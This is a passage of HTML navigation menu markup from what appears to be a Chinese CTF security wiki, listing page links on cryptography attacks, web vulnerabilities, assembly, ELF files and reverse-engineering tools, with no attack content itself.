class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-7 type=checkbox id=nav-4-5-7> <label class=md-nav__link for=nav-4-5-7> 分组模式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=分组模式 data-md-level=3> <label class=md-nav__title for=nav-4-5-7> <span class="md-nav__icon md-icon"></span> 分组模式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/introduction/ class=md-nav__link> 分组模式 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/padding/ class=md-nav__link> 填充方式 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/ecb/ class=md-nav__link> ECB </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/cbc/ class=md-nav__link> CBC </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/pcbc/ class=md-nav__link> PCBC </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/cfb/ class=md-nav__link> CFB </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/ofb/ class=md-nav__link> OFB </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/ctr/ class=md-nav__link> CTR </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/mode/padding-oracle-attack/ class=md-nav__link> Padding Oracle Attack </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6 type=checkbox id=nav-4-6> <label class=md-nav__link for=nav-4-6> 非对称加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=非对称加密 data-md-level=2> <label class=md-nav__title for=nav-4-6> <span class="md-nav__icon md-icon"></span> 非对称加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/introduction/ class=md-nav__link> 介绍 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-2 type=checkbox id=nav-4-6-2> <label class=md-nav__link for=nav-4-6-2> RSA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=RSA data-md-level=3> <label class=md-nav__title for=nav-4-6-2> <span class="md-nav__icon md-icon"></span> RSA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_theory/ class=md-nav__link> RSA 介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_module_attack/ class=md-nav__link> 模数相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_e_attack/ class=md-nav__link> 公钥指数相关攻击 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-2-4 type=checkbox id=nav-4-6-2-4> <label class=md-nav__link for=nav-4-6-2-4> 私钥d相关攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=私钥d相关攻击 data-md-level=4> <label class=md-nav__title for=nav-4-6-2-4> <span class="md-nav__icon md-icon"></span> 私钥d相关攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/d_attacks/rsa_d_attack/ class=md-nav__link> 私钥 d 相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/d_attacks/rsa_extending_wiener/ class=md-nav__link> 扩展维纳攻击 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack/ class=md-nav__link> Coppersmith 相关攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/ class=md-nav__link> RSA 选择明密文攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_side_channel/ class=md-nav__link> RSA 侧信道攻击 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_pkcs_attack/ class=md-nav__link> Bleichenbacher's attack </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/rsa/rsa_complex/ class=md-nav__link> RSA 复杂题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-3 type=checkbox id=nav-4-6-3> <label class=md-nav__link for=nav-4-6-3> 背包加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=背包加密 data-md-level=3> <label class=md-nav__title for=nav-4-6-3> <span class="md-nav__icon md-icon"></span> 背包加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/knapsack/knapsack/ class=md-nav__link> 背包加密 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-4 type=checkbox id=nav-4-6-4> <label class=md-nav__link for=nav-4-6-4> 离散对数相关 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=离散对数相关 data-md-level=3> <label class=md-nav__title for=nav-4-6-4> <span class="md-nav__icon md-icon"></span> 离散对数相关 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/discrete-log/discrete-log/ class=md-nav__link> 离散对数 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/discrete-log/elgamal/ class=md-nav__link> ElGamal </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/discrete-log/ecc/ class=md-nav__link> ECC </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-5 type=checkbox id=nav-4-6-5> <label class=md-nav__link for=nav-4-6-5> 格密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=格密码 data-md-level=3> <label class=md-nav__title for=nav-4-6-5> <span class="md-nav__icon md-icon"></span> 格密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/lattice/overview/ class=md-nav__link> 格概述 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/lattice/introduction/ class=md-nav__link> 基本介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/lattice/lattice-reduction/ class=md-nav__link> 格基规约算法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/asymmetric/lattice/cvp/ class=md-nav__link> CVP </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7 type=checkbox id=nav-4-7> <label class=md-nav__link for=nav-4-7> 哈希函数 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=哈希函数 data-md-level=2> <label class=md-nav__title for=nav-4-7> <span class="md-nav__icon md-icon"></span> 哈希函数 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/hash/introduction/ class=md-nav__link> 哈希函数 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-2 type=checkbox id=nav-4-7-2> <label class=md-nav__link for=nav-4-7-2> MD5 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=MD5 data-md-level=3> <label class=md-nav__title for=nav-4-7-2> <span class="md-nav__icon md-icon"></span> MD5 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/hash/md5/ class=md-nav__link> MD5 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-3 type=checkbox id=nav-4-7-3> <label class=md-nav__link for=nav-4-7-3> SHA1 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SHA1 data-md-level=3> <label class=md-nav__title for=nav-4-7-3> <span class="md-nav__icon md-icon"></span> SHA1 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/hash/sha1/ class=md-nav__link> SHA1 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-4 type=checkbox id=nav-4-7-4> <label class=md-nav__link for=nav-4-7-4> FNV <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=FNV data-md-level=3> <label class=md-nav__title for=nav-4-7-4> <span class="md-nav__icon md-icon"></span> FNV </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/hash/fnv/ class=md-nav__link> Fowler–Noll–Vo hash function </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-5 type=checkbox id=nav-4-7-5> <label class=md-nav__link for=nav-4-7-5> Hash Attack <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Hash Attack" data-md-level=3> <label class=md-nav__title for=nav-4-7-5> <span class="md-nav__icon md-icon"></span> Hash Attack </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/hash/attack/ class=md-nav__link> Hash Attack </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/hash/complex/ class=md-nav__link> 综合题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8 type=checkbox id=nav-4-8> <label class=md-nav__link for=nav-4-8> 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=数字签名 data-md-level=2> <label class=md-nav__title for=nav-4-8> <span class="md-nav__icon md-icon"></span> 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/signature/introduction/ class=md-nav__link> 数字签名 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8-2 type=checkbox id=nav-4-8-2> <label class=md-nav__link for=nav-4-8-2> RSA 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="RSA 数字签名" data-md-level=3> <label class=md-nav__title for=nav-4-8-2> <span class="md-nav__icon md-icon"></span> RSA 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/signature/rsa/ class=md-nav__link> RSA 数字签名 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8-3 type=checkbox id=nav-4-8-3> <label class=md-nav__link for=nav-4-8-3> ElGamal 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ElGamal 数字签名" data-md-level=3> <label class=md-nav__title for=nav-4-8-3> <span class="md-nav__icon md-icon"></span> ElGamal 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/signature/elgamal/ class=md-nav__link> ElGamal </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8-4 type=checkbox id=nav-4-8-4> <label class=md-nav__link for=nav-4-8-4> DSA 数字签名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="DSA 数字签名" data-md-level=3> <label class=md-nav__title for=nav-4-8-4> <span class="md-nav__icon md-icon"></span> DSA 数字签名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/signature/dsa/ class=md-nav__link> DSA </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-9 type=checkbox id=nav-4-9> <label class=md-nav__link for=nav-4-9> 攻击思想总结 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=攻击思想总结 data-md-level=2> <label class=md-nav__title for=nav-4-9> <span class="md-nav__icon md-icon"></span> 攻击思想总结 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/attack-summary/attack-mode/ class=md-nav__link> 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-9-2 type=checkbox id=nav-4-9-2> <label class=md-nav__link for=nav-4-9-2> 中间相遇攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=中间相遇攻击 data-md-level=3> <label class=md-nav__title for=nav-4-9-2> <span class="md-nav__icon md-icon"></span> 中间相遇攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/attack-summary/meet-in-the-middle/ class=md-nav__link> 中间相遇攻击 - MITM </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-9-3 type=checkbox id=nav-4-9-3> <label class=md-nav__link for=nav-4-9-3> 比特攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=比特攻击 data-md-level=3> <label class=md-nav__title for=nav-4-9-3> <span class="md-nav__icon md-icon"></span> 比特攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/attack-summary/bit-attack/ class=md-nav__link> 比特攻击 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-10 type=checkbox id=nav-4-10> <label class=md-nav__link for=nav-4-10> 证书格式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=证书格式 data-md-level=2> <label class=md-nav__title for=nav-4-10> <span class="md-nav__icon md-icon"></span> 证书格式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/certificate/introduction/ class=md-nav__link> 证书格式 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5 type=checkbox id=nav-5> <label class=md-nav__link for=nav-5> Web <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Web data-md-level=1> <label class=md-nav__title for=nav-5> <span class="md-nav__icon md-icon"></span> Web </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../web/introduction/ class=md-nav__link> Web 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-2 type=checkbox id=nav-5-2> <label class=md-nav__link for=nav-5-2> SQL 注入 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SQL 注入" data-md-level=2> <label class=md-nav__title for=nav-5-2> <span class="md-nav__icon md-icon"></span> SQL 注入 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../web/sqli/ class=md-nav__link> SQL 注入 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-3 type=checkbox id=nav-5-3> <label class=md-nav__link for=nav-5-3> XSS 跨站脚本攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="XSS 跨站脚本攻击" data-md-level=2> <label class=md-nav__title for=nav-5-3> <span class="md-nav__icon md-icon"></span> XSS 跨站脚本攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../web/xss/ class=md-nav__link> XSS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-4 type=checkbox id=nav-5-4> <label class=md-nav__link for=nav-5-4> CSRF 跨站请求伪造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="CSRF 跨站请求伪造" data-md-level=2> <label class=md-nav__title for=nav-5-4> <span class="md-nav__icon md-icon"></span> CSRF 跨站请求伪造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../web/csrf/ class=md-nav__link> CSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-5 type=checkbox id=nav-5-5> <label class=md-nav__link for=nav-5-5> SSRF 服务端请求伪造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SSRF 服务端请求伪造" data-md-level=2> <label class=md-nav__title for=nav-5-5> <span class="md-nav__icon md-icon"></span> SSRF 服务端请求伪造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../web/ssrf/ class=md-nav__link> SSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-6 type=checkbox id=nav-5-6> <label class=md-nav__link for=nav-5-6> PHP 代码审计 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="PHP 代码审计" data-md-level=2> <label class=md-nav__title for=nav-5-6> <span class="md-nav__icon md-icon"></span> PHP 代码审计 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../web/php/php/ class=md-nav__link> PHP 代码审计 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-6 type=checkbox id=nav-6> <label class=md-nav__link for=nav-6> Assembly <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Assembly data-md-level=1> <label class=md-nav__title for=nav-6> <span class="md-nav__icon md-icon"></span> Assembly </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../assembly/x86-x64/readme/ class=md-nav__link> x86_x64 </a> </li> <li class=md-nav__item> <a href=../../../../../../../assembly/mips/readme/ class=md-nav__link> MIPS </a> </li> <li class=md-nav__item> <a href=../../../../../../../assembly/arm/readme/ class=md-nav__link> ARM </a> </li> <li class=md-nav__item> <a href=../../../../../../../assembly/risc-v/readme/ class=md-nav__link> Risc-V </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7 type=checkbox id=nav-7> <label class=md-nav__link for=nav-7> Executable <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Executable data-md-level=1> <label class=md-nav__title for=nav-7> <span class="md-nav__icon md-icon"></span> Executable </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1 type=checkbox id=nav-7-1> <label class=md-nav__link for=nav-7-1> ELF 文件 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ELF 文件" data-md-level=2> <label class=md-nav__title for=nav-7-1> <span class="md-nav__icon md-icon"></span> ELF 文件 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-1 type=checkbox id=nav-7-1-1> <label class=md-nav__link for=nav-7-1-1> ELF 文件基本结构 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ELF 文件基本结构" data-md-level=3> <label class=md-nav__title for=nav-7-1-1> <span class="md-nav__icon md-icon"></span> ELF 文件基本结构 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/basic-info/ class=md-nav__link> ELF 文件 </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/sections/ class=md-nav__link> Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/code-sections/ class=md-nav__link> Code Section </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/data-related-sections/ class=md-nav__link> Data Related Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/symbol-table/ class=md-nav__link> .symtab: Symbol Table </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/strings-sections/ class=md-nav__link> String Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/dynamic-sections/ class=md-nav__link> Dynamic Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/structure/misc-sections/ class=md-nav__link> Misc Sections </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-2 type=checkbox id=nav-7-1-2> <label class=md-nav__link for=nav-7-1-2> 程序加载 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序加载 data-md-level=3> <label class=md-nav__title for=nav-7-1-2> <span class="md-nav__icon md-icon"></span> 程序加载 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../executable/elf/program-loading/ class=md-nav__link> 程序加载 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-3 type=checkbox id=nav-7-1-3> <label class=md-nav__link for=nav-7-1-3> 程序链接 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序链接 data-md-level=3> <label class=md-nav__title for=nav-7-1-3> <span class="md-nav__icon md-icon"></span> 程序链接 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../executable/elf/linking/program-linking/ class=md-nav__link> 程序链接 </a> </li> <li class=md-nav__item> <a href=../../../../../../../executable/elf/linking/symbol-resolve/ class=md-nav__link> Symbol Reslove </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-4 type=checkbox id=nav-7-1-4> <label class=md-nav__link for=nav-7-1-4> 程序执行流程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序执行流程 data-md-level=3> <label class=md-nav__title for=nav-7-1-4> <span class="md-nav__icon md-icon"></span> 程序执行流程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../executable/elf/running-overview/ class=md-nav__link> 程序执行流程 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8 type=checkbox id=nav-8> <label class=md-nav__link for=nav-8> Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Reverse data-md-level=1> <label class=md-nav__title for=nav-8> <span class="md-nav__icon md-icon"></span> Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-1 type=checkbox id=nav-8-1> <label class=md-nav__link for=nav-8-1> Reverse Overview <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Reverse Overview" data-md-level=2> <label class=md-nav__title for=nav-8-1> <span class="md-nav__icon md-icon"></span> Reverse Overview </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/introduction/ class=md-nav__link> 软件逆向工程简介 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2 type=checkbox id=nav-8-2> <label class=md-nav__link for=nav-8-2> Tools <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tools data-md-level=2> <label class=md-nav__title for=nav-8-2> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-1 type=checkbox id=nav-8-2-1> <label class=md-nav__link for=nav-8-2-1> 静态分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=静态分析 data-md-level=3> <label class=md-nav__title for=nav-8-2-1> <span class="md-nav__icon md-icon"></span> 静态分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/static-analyze/ida/ class=md-nav__link> IDA Pro </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/static-analyze/ghidra/ class=md-nav__link> Ghidra </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/static-analyze/jadx/ class=md-nav__link> jadx </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/static-analyze/dnspy/ class=md-nav__link> Dnspy </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-2 type=checkbox id=nav-8-2-2> <label class=md-nav__link for=nav-8-2-2> 动态调试 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=动态调试 data-md-level=3> <label class=md-nav__title for=nav-8-2-2> <span class="md-nav__icon md-icon"></span> 动态调试 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/debug/gdb/ class=md-nav__link> gdb </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/debug/ollydbg/ class=md-nav__link> ollydbg </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/debug/xdbg/ class=md-nav__link> x64dbg/x32dbg </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/debug/windbg/ class=md-nav__link> windbg </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-3 type=checkbox id=nav-8-2-3> <label class=md-nav__link for=nav-8-2-3> 约束求解 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=约束求解 data-md-level=3> <label class=md-nav__title for=nav-8-2-3> <span class="md-nav__icon md-icon"></span> 约束求解 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/constraint/z3/ class=md-nav__link> z3 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-4 type=checkbox id=nav-8-2-4> <label class=md-nav__link for=nav-8-2-4> 模拟执行 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=模拟执行 data-md-level=3> <label class=md-nav__title for=nav-8-2-4> <span class="md-nav__icon md-icon"></span> 模拟执行 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/simulate-execution/angr/ class=md-nav__link> angr </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/tools/simulate-execution/unicorn/ class=md-nav__link> Unicorn Engine </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-3 type=checkbox id=nav-8-3> <label class=md-nav__link for=nav-8-3> 算法逆向 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=算法逆向 data-md-level=2> <label class=md-nav__title for=nav-8-3> <span class="md-nav__icon md-icon"></span> 算法逆向 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/identify-encode-encryption/introduction/ class=md-nav__link> 常见加密算法和编码识别 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-4 type=checkbox id=nav-8-4> <label class=md-nav__link for=nav-8-4> 代码混淆 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=代码混淆 data-md-level=2> <label class=md-nav__title for=nav-8-4> <span class="md-nav__icon md-icon"></span> 代码混淆 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/obfuscate/junk-code/ class=md-nav__link> 花指令 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/obfuscate/smc/ class=md-nav__link> Self-Modified Code </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/obfuscate/control-flow-flatten/ class=md-nav__link> 控制流平坦化 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/obfuscate/movfuscator/ class=md-nav__link> movofuscator </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-5 type=checkbox id=nav-8-5> <label class=md-nav__link for=nav-8-5> 迷宫逆向 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=迷宫逆向 data-md-level=2> <label class=md-nav__title for=nav-8-5> <span class="md-nav__icon md-icon"></span> 迷宫逆向 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/maze/maze/ class=md-nav__link> 迷宫问题 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-6 type=checkbox id=nav-8-6> <label class=md-nav__link for=nav-8-6> 虚拟机逆向 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=虚拟机逆向 data-md-level=2> <label class=md-nav__title for=nav-8-6> <span 